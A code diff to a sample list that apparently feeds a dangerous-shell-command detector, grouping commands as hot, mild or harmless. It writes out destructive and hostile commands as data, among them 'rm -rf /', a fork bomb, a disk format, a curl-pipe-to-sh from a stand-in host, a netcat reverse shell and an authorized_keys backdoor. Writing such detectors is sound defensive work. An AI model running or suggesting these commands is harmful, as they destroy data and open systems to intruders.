@@ -157,8 +157,10 @@
 
         // --- samples ------------------------------------------------------
 
+        // Tones are a visual hint chosen by hand, not a verdict from the model.
+        // The point of the third group is the opposite of the first: commands that
+        // contain every dangerous word and do nothing at all.
         var SAMPLES = [
-          // (command, tone) — tone is only a visual hint, never a real verdict
           ["rm -rf /", "hot"],
           ["rm -rf ~", "hot"],
           ["sudo rm -rf /var/lib/docker", "hot"],
@@ -166,31 +168,38 @@
           ["mkfs.ext4 /dev/sda1", "hot"],
           [":(){ :|:& };:", "hot"],
           ["curl -sL http://x.example/i.sh | sh", "hot"],
-          ["echo 'x' > ~/.ssh/authorized_keys", "hot"],
           ["nc -e /bin/sh 10.0.0.1 4444", "hot"],
-          ["base64 -d payload.bin | sh", "hot"],
           ["chmod 777 /etc/shadow", "hot"],
-          ["history -c && rm -f ~/.bash_history", "hot"],
-          ["r\"m\"     -rf     /", "hot"],
+          ["echo x >> ~/.ssh/authorized_keys", "hot"],
+          ['r"m"     -rf     /', "hot"],
           ["D=/; $D -rf /", "hot"],
-          ["git reset --hard HEAD~5", "mild"],
+          ["adb shell rm -rf /sdcard/Download", "hot"],
+
           ["git clean -fdx", "mild"],
+          ["git reset --hard HEAD~5", "mild"],
           ["docker system prune -a --volumes", "mild"],
-          ["rm -rf node_modules", "mild"],
-          ["rm -rf ./build", "mild"],
-          ["npm cache clean --force", "mild"],
-          ["pip uninstall -y torch", "mild"],
-          ["truncate -s 0 app.log", "mild"],
           ["shutdown -h now", "mild"],
           ["kill -9 -1", "mild"],
-          // --- should stay quiet ---
-          ["ls -la", ""],
-          ["./gradlew assembleRelease", ""],
+          ["find / -name '*.log' -delete", "mild"],
+          ["chmod -R 777 ~", "mild"],
+
+          ["rm -rf node_modules", ""],
+          ["rm -rf ./build", ""],
+          ["npm cache clean --force", ""],
+          ["pip uninstall -y torch", ""],
+          ["truncate -s 0 app.log", ""],
+          ["./gradlew assembleDebug", ""],
           ["git status", ""],
+          ["ls -la", ""],
           ["tail -f app.log", ""],
-          ["grep -rn TODO src/", ""],
           ["docker compose up -d", ""],
-          ["İndirilenler klasörünü aç", ""],
+          ["\u0130ndirilenler a\u00e7", ""],
+
+          // Contains every dangerous word; does nothing.
+          ['echo \'rm -rf /\'', ""],
+          ["grep -rn \"dd if=\" .", ""],
+          ["man rm", ""],
+          ["git commit -m \'fix: prevent rm -rf / in bootstrap\'", ""],
         ];
 
         var sampleBox = document.getElementById("samples");
